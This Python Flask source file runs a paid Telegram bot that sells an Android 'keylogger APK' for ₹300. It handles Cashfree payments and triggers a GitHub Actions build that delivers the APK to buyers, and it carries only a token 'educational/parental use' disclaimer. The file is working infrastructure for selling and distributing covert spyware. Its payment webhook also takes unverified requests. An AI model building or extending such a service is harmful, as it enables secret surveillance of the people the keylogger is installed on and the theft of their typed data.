import os
import json
import logging
import requests
from flask import Flask, request, render_template

app = Flask(__name__)
logging.basicConfig(level=logging.DEBUG)
app.logger.setLevel(logging.DEBUG)

# Load environment variables
BOT_TOKEN = os.getenv("BOT_TOKEN")
REPO_OWNER = os.getenv("REPO_OWNER")
REPO_NAME = os.getenv("REPO_NAME")
GITHUB_PAT = os.getenv("GITHUB_PAT")
CASHFREE_APP_ID = os.getenv("CASHFREE_APP_ID")
CASHFREE_SECRET_KEY = os.getenv("CASHFREE_SECRET_KEY")
PAID_USERS_FILE = "paid_users.json"

# Validate required config
if not all([BOT_TOKEN, REPO_OWNER, REPO_NAME, GITHUB_PAT, CASHFREE_APP_ID, CASHFREE_SECRET_KEY]):
    raise ValueError("One or more required environment variables are missing.")

# Paid user logic
def load_paid_users():
    if not os.path.exists(PAID_USERS_FILE):
        return []
    with open(PAID_USERS_FILE, "r") as f:
        return json.load(f)

def save_paid_user(chat_id):
    users = load_paid_users()
    if chat_id not in users:
        users.append(chat_id)
        with open(PAID_USERS_FILE, "w") as f:
            json.dump(users, f)

def is_user_paid(chat_id):
    return chat_id in load_paid_users()

# Home route
@app.route("/", methods=["GET"])
def home():
    return render_template("index.html") if os.path.exists("templates/index.html") else "Bot is running."

# Telegram webhook
@app.route(f"/{BOT_TOKEN}", methods=["POST"])
def handle_message():
    data = request.json
    app.logger.debug(f"Telegram data: {data}")

    chat_id = data.get("message", {}).get("chat", {}).get("id")
    command = data.get("message", {}).get("text")

    if not chat_id or not command:
        return "Invalid data", 400

    if command == "/start":
        welcome = (
            "👋 Welcome to the keylogger APK Generator Bot!\n\n"
            "Developed by cyber naveen. For updates, follow [@cyber.naveen.info](https://www.instagram.com/cyber.naveen.info)\n\n"
            "🛡 Disclaimer: This is for educational/parental use only.\n\n"
            "Use /pay to proceed or /request_apk after payment."
        )
        send_message(chat_id, welcome, "Markdown")

    elif command == "/pay":
        payment_link = create_cashfree_order(chat_id)
        if payment_link:
            send_message(chat_id, f"💸 Click here to pay ₹300:\n{payment_link}")
        else:
            send_message(chat_id, "❌ Payment link could not be created. Try again later.")

    elif command == "/request_apk":
        if not is_user_paid(chat_id):
            send_message(chat_id, "🚫 Please pay ₹300 to access this feature. Use /pay to begin.")
            return "OK"
        response = trigger_github_action(chat_id)
        if response and response.status_code == 204:
            send_message(chat_id, "✅ Your APK is being generated. You'll receive it shortly!")
        else:
            app.logger.error(f"GitHub Trigger Failed: {response.text if response else 'No response'}")
            send_message(chat_id, "❌ Error generating APK. Try again later.")

    else:
        send_message(chat_id, "❓ Unknown command. Use /start for help.")

    return "OK"

# GitHub Trigger
def trigger_github_action(chat_id):
    url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/actions/workflows/build.yml/dispatches"
    payload = {
        "ref": "main",
        "inputs": {"chat_id": str(chat_id)}
    }
    headers = {
        "Authorization": f"Bearer {GITHUB_PAT}",
        "Accept": "application/vnd.github.v3+json"
    }
    try:
        response = requests.post(url, headers=headers, json=payload)
        return response
    except Exception as e:
        app.logger.error(f"GitHub Trigger Exception: {e}")
        return None

# Telegram Send
def send_message(chat_id, text, parse_mode=None):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {"chat_id": chat_id, "text": text}
    if parse_mode:
        payload["parse_mode"] = parse_mode
    try:
        response = requests.post(url, data=payload)
        app.logger.debug(f"Telegram response: {response.status_code} - {response.text}")
    except Exception as e:
        app.logger.error(f"Telegram Error: {e}")

# Cashfree Create Order
def create_cashfree_order(chat_id):
    url = "https://sandbox.cashfree.com/pg/orders"
    headers = {
        "x-client-id": CASHFREE_APP_ID,
        "x-client-secret": CASHFREE_SECRET_KEY,
        "Content-Type": "application/json"
    }
    order_id = f"kidslogger_{chat_id}"
    payload = {
        "order_id": order_id,
        "order_amount": 300.0,
        "order_currency": "INR",
        "customer_details": {
            "customer_id": str(chat_id),
            "customer_email": "demo@example.com",
            "customer_phone": "9999999999"
        },
        "order_meta": {
            "return_url": "https://tellogs.koyeb.app//paid-success"
        }
    }
    try:
        res = requests.post(url, headers=headers, json=payload)
        if res.status_code == 200:
            return res.json().get("payment_link")
        else:
            app.logger.error(f"Cashfree error: {res.text}")
            return None
    except Exception as e:
        app.logger.error(f"Cashfree exception: {e}")
        return None

# Cashfree webhook (to mark user as paid)
@app.route("/cashfree-webhook", methods=["POST"])
def cashfree_webhook():
    data = request.json
    app.logger.debug(f"Cashfree webhook: {data}")

    if data.get("event") == "PAYMENT_SUCCESS":
        order_id = data.get("data", {}).get("order", {}).get("order_id", "")
        chat_id = order_id.replace("kidslogger_", "")
        if chat_id:
            save_paid_user(chat_id)
            send_message(chat_id, "✅ Payment confirmed! Now use /request_apk to get your APK.")
    return "OK", 200

# Run the app
if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port, use_reloader=False)
